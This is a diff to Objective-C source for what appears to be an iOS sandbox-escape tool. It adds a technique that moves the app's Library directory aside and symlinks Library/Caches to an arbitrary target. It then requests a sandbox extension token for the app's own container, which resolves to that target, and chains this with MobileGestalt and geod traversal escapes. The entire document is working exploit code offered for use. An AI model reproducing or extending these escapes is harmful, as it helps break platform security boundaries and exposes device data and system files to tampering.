@@ -353,6 +353,74 @@ static int64_t bq_query_escape(uint64_t cls, NSString *ident, BOOL group,
     return h;
 }
 
+// Class 2 (the app's own data container) has one more door: the sandbox
+// refuses to rename the part directories themselves (Library/Caches, Documents,
+// tmp, ...), but the parent Library directory can be renamed on some builds.
+// Move it aside, recreate a small Library with a symlinked Caches, query class 2
+// and restore the original Library immediately. The token remains valid for the
+// resolved target.
+static int64_t bq_escape_class2_parent(NSString *target, NSString **linkOut) {
+    NSString *home = NSHomeDirectory();
+    NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
+    if (!home.length || !bid.length) return -6;
+
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSString *lib = [home stringByAppendingPathComponent:@"Library"];
+    NSString *bak = [home stringByAppendingPathComponent:@"Library.bqtool"];
+    NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];
+
+    // Recover an interrupted attempt. A stale backup is only safe to restore
+    // when the live Library is missing or is our temporary Caches symlink.
+    if ([fm fileExistsAtPath:bak]) {
+        struct stat st;
+        BOOL temp = ([fm fileExistsAtPath:lib] &&
+                     lstat(caches.fileSystemRepresentation, &st) == 0 &&
+                     S_ISLNK(st.st_mode));
+        if (temp || ![fm fileExistsAtPath:lib]) {
+            bq_restore_path(lib, bak);
+        } else {
+            BQLog(@"class2-parent: stale %@ exists; refusing to touch %@", bak, lib);
+            return -2;
+        }
+    }
+    if (![fm fileExistsAtPath:lib]) return -2;
+
+    NSError *e = nil;
+    if (![fm moveItemAtPath:lib toPath:bak error:&e]) {
+        BQLog(@"class2-parent: move Library -> bak failed: %@", e);
+        return -2;
+    }
+    if (![fm createDirectoryAtPath:lib withIntermediateDirectories:YES attributes:nil error:&e]) {
+        BQLog(@"class2-parent: recreate Library failed: %@", e);
+        [fm moveItemAtPath:bak toPath:lib error:nil];
+        return -2;
+    }
+    if (symlink(target.fileSystemRepresentation, caches.fileSystemRepresentation) != 0) {
+        BQLog(@"class2-parent: symlink Caches failed errno=%d (%s)", errno, strerror(errno));
+        bq_restore_path(lib, bak);
+        return -2;
+    }
+
+    NSString *path = nil;
+    int64_t h = bq_query_escape(2, bid, NO, 3, @"", 0x8100000000ULL,
+                                @"class2-parent", &path);
+    // Restore the real Library before returning. Remove the symlink first so a
+    // recursive directory removal can never walk into the target.
+    unlink(caches.fileSystemRepresentation);
+    rmdir(lib.fileSystemRepresentation);
+    NSError *re = nil;
+    if (![fm moveItemAtPath:bak toPath:lib error:&re]) {
+        BQLog(@"class2-parent: restore Library failed: %@", re);
+        bq_restore_path(lib, bak);
+    }
+    if (h >= 0) {
+        if (linkOut) *linkOut = target;
+        BQLog(@"escape: using class2 parent -> %@", target);
+        return h;
+    }
+    return h;
+}
+
 static int64_t bq_escape_symlink(NSString *target, NSString **linkOut) {
     NSString *groot = BQGroupRoot();
     NSString *gid = BQGroupID();
@@ -416,7 +484,21 @@ int64_t BQEscape(NSString *target, NSString **linkOut) {
         last = h;
     }
 
-    // 3. Class 13 direct MobileGestalt query (some 27.0.x builds).
+    // 3. Class 2 parent-directory symlink. No app group needed: move the app's
+    //    Library aside, create Library/Caches -> target, query the app's own
+    //    container (class 2), then restore Library.
+    {
+        NSString *link = nil;
+        int64_t h = bq_escape_class2_parent(target, &link);
+        if (h >= 0) {
+            if (linkOut) *linkOut = link ?: target;
+            BQLog(@"escape: using class2 parent");
+            return h;
+        }
+        last = h;
+    }
+
+    // 4. Class 13 direct MobileGestalt query (some 27.0.x builds).
     if ([target isEqualToString:kMGCaches]) {
         NSString *p = nil;
         int64_t h = bq_query_escape(13, kMGGroup, YES, 3, @"", 0x8100000000ULL,
@@ -429,7 +511,7 @@ int64_t BQEscape(NSString *target, NSString **linkOut) {
         last = h;
     }
 
-    // 4. Class 12 geod part-domain traversal (older builds).
+    // 5. Class 12 geod part-domain traversal (older builds).
     if (target.isAbsolutePath) {
         NSString *dom = [bq_dots(12) stringByAppendingString:target];
         NSString *p = nil;
@@ -450,6 +532,7 @@ int64_t BQEscape(NSString *target, NSString **linkOut) {
 void BQEndEscape(int64_t handle) {
     if (handle >= 0 && g.release) g.release(handle);
     NSString *groot = BQGroupRoot();
+    if (!groot.length) return;
     NSString *lib = [groot stringByAppendingPathComponent:@"Library"];
     NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];
     NSString *bak = [lib stringByAppendingPathComponent:@"Caches.bqtool"];
